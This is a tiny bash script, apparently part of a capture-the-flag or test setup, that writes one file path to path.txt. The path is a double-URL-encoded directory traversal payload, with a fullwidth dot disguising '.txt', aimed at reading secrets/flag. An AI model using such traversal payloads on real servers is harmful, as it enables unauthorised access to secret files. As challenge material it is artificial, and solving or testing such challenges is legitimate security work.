#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
cat > "$OUT_DIR/path.txt" <<'EOF'
public/%252e%252e/secrets/flag%ef%bc%8etxt
EOF
